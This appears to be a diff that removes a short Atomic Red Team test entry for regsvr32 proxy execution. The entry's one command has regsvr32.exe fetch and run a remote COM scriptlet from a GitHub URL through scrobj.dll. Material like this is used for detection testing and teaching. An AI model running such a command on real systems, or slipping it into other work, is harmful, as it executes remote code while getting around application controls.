@@ -1,7 +1,0 @@
-#TechniqueName: Signed Binary Proxy Execution: Regsvr32
-#AtomicTestName: Regsvr32 remote COM scriptlet execution
-#Language: cmd
-
-#commands
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
-
